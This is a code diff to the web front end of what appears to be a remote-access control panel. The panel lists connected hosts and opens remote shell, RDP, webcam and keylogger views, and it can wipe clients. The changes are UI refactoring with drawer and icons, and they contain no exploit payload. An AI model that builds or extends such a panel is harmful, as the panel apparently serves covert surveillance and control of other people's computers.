@@ -136,7 +136,7 @@ async function loadHosts() {
   const host = $('h-rows');
   host.innerHTML = '';
   if (d.rows.length === 0) {
-    host.innerHTML = '<div class="empty">no hosts</div>';
+    host.innerHTML = '<div class="empty"><svg viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><line x1="6" x2="6.01" y1="6" y2="6"/><line x1="6" x2="6.01" y1="18" y2="18"/></svg>no hosts</div>';
   } else {
     d.rows.forEach(c => host.appendChild(buildRow(c, () => openHostDetail(c))));
   }
@@ -164,48 +164,61 @@ function buildRow(c, onOpen) {
   return el;
 }
 
+// ---------- DRAWER SYSTEM ----------
+function openDrawer() {
+  $('drawer').classList.add('open');
+  $('drawer-backdrop').classList.add('open');
+}
+function closeDrawer() {
+  $('drawer').classList.remove('open');
+  $('drawer-backdrop').classList.remove('open');
+}
+
+$('drawer-close').addEventListener('click', closeDrawer);
+$('drawer-backdrop').addEventListener('click', closeDrawer);
+document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeDrawer(); });
+
 async function openHostDetail(c) {
-  const box = $('h-detail');
-  box.innerHTML = '';
+  $('drawer-title').textContent = c.hostname;
+  const box = $('drawer-content');
 
-  const el = document.createElement('div');
-  el.className = 'detail';
-  el.innerHTML = `
-    <h3>${esc(c.hostname)}</h3>
-    <div class="sub" style="margin:0;color:var(--muted)">${esc(c.ip)}</div>
+  box.innerHTML = `
+    <div class="detail">
+      <div class="sub" style="margin:0;color:var(--muted)">${esc(c.ip)}</div>
 
-    <div class="kv">
-      <div class="k">client id</div> <div class="v">${c.id}</div>
-      <div class="k">state</div>     <div class="v plain" style="color:${c.online ? 'var(--green)' : 'var(--muted)'}">${c.online ? 'online' : 'offline'}</div>
-      <div class="k">ipv4</div>      <div class="v">${esc(c.ip)}</div>
-      <div class="k">country</div>   <div class="v plain">${c.country ? esc(c.country.flag + ' ' + c.country.name) : '—'}</div>
-      <div class="k">last seen</div> <div class="v plain">${new Date(c.lastSeen).toLocaleString()}</div>
-    </div>
+      <div class="kv">
+        <div class="k">client id</div> <div class="v">${c.id}</div>
+        <div class="k">state</div>     <div class="v plain" style="color:${c.online ? 'var(--green)' : 'var(--muted)'}">${c.online ? 'online' : 'offline'}</div>
+        <div class="k">ipv4</div>      <div class="v">${esc(c.ip)}</div>
+        <div class="k">country</div>   <div class="v plain">${c.country ? esc(c.country.flag + ' ' + c.country.name) : '—'}</div>
+        <div class="k">last seen</div> <div class="v plain">${new Date(c.lastSeen).toLocaleString()}</div>
+      </div>
 
-    <div style="display:flex;gap:8px;margin-top:16px;flex-wrap:wrap">
-      <button class="ghost mini" data-remote>go to remote</button>
-      <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
-      <button class="ghost mini" data-close>close</button>
-    </div>
+      <div style="display:flex;gap:8px;margin-top:24px;flex-wrap:wrap">
+        <button class="ghost mini" data-remote>go to remote</button>
+        <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
+      </div>
 
-    <h3 style="margin-top:20px">uploads</h3>
-    <div id="u-list"><div class="note">loading…</div></div>`;
-  box.appendChild(el);
+      <h3 style="margin-top:28px;font-size:14px;border-bottom:1px solid var(--line);padding-bottom:8px;">uploads</h3>
+      <div id="u-list" style="margin-top:12px;"><div class="note">loading…</div></div>
+    </div>`;
 
-  el.querySelector('[data-close]').addEventListener('click', () => box.innerHTML = '');
-  el.querySelector('[data-remote]').addEventListener('click', () => {
+  openDrawer();
+
+  box.querySelector('[data-remote]').addEventListener('click', () => {
+    closeDrawer();
     document.querySelector('.nav a[data-tab="remote"]')?.click();
     state.remote.q = c.hostname;
     $('r-search').value = c.hostname;
     loadRemote();
   });
-  el.querySelector('[data-del]').addEventListener('click', async () => {
+  box.querySelector('[data-del]').addEventListener('click', async () => {
     if (!confirm(`delete ${c.hostname}?`)) return;
     const r = await fetch(`/api/clients/${c.id}`, { method: 'DELETE' });
-    if (r.ok) { box.innerHTML = ''; loadHosts(); }
+    if (r.ok) { closeDrawer(); loadHosts(); }
   });
 
-  await loadUploads(c.id, el.querySelector('#u-list'));
+  await loadUploads(c.id, box.querySelector('#u-list'));
 }
 
 async function loadUploads(clientId, container) {
@@ -247,7 +260,7 @@ async function loadRemote() {
   const host = $('r-rows');
   host.innerHTML = '';
   if (d.rows.length === 0) {
-    host.innerHTML = '<div class="empty">no online clients</div>';
+    host.innerHTML = '<div class="empty"><svg viewBox="0 0 24 24"><path d="M18 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3Z"/><path d="M6 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3Z"/><path d="M10 9h4"/><path d="M10 15h4"/></svg>no online clients</div>';
   } else {
     d.rows.forEach(c => host.appendChild(buildRemoteRow(c)));
   }
@@ -271,7 +284,9 @@ function buildRemoteRow(c) {
     <span class="ping">${fmtPing(c.ping)}</span>
     <span class="seen">${fmtAgo(c.lastSeen)}</span>
     <span class="actions" style="position:relative">
-      <button class="ghost mini" data-gear title="actions" style="padding:4px 10px">⚙</button>
+      <button class="ghost mini" data-gear title="actions" style="padding:4px 10px">
+        <svg class="icon" viewBox="0 0 24 24" style="width:14px;height:14px;"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg>
+      </button>
     </span>`;
   el.querySelector('[data-gear]').addEventListener('click', (e) => {
     e.stopPropagation();
@@ -343,39 +358,22 @@ async function wipeClient(c) {
 }
 
 function openConsole(c, shell) {
-  const q = new URLSearchParams({
-    id: String(c.id),
-    host: c.hostname || '',
-    ip: c.ip || '',
-    shell: shell || 'cmd',
-  });
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd' });
   window.open('/cmd.html?' + q.toString(), '_blank', 'width=1000,height=640');
 }
 
 function openRdp(c) {
-  const q = new URLSearchParams({
-    id: String(c.id),
-    host: c.hostname || '',
-    ip: c.ip || '',
-  });
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open('/rdp.html?' + q.toString(), '_blank', 'width=1200,height=760');
 }
 
 function openWebcam(c) {
-  const q = new URLSearchParams({
-    id: String(c.id),
-    host: c.hostname || '',
-    ip: c.ip || '',
-  });
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open('/webcam.html?' + q.toString(), '_blank', 'width=1000,height=700');
 }
 
 function openKeylog(c) {
-  const q = new URLSearchParams({
-    id: String(c.id),
-    host: c.hostname || '',
-    ip: c.ip || '',
-  });
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open('/keylog.html?' + q.toString(), '_blank', 'width=1000,height=700');
 }
 
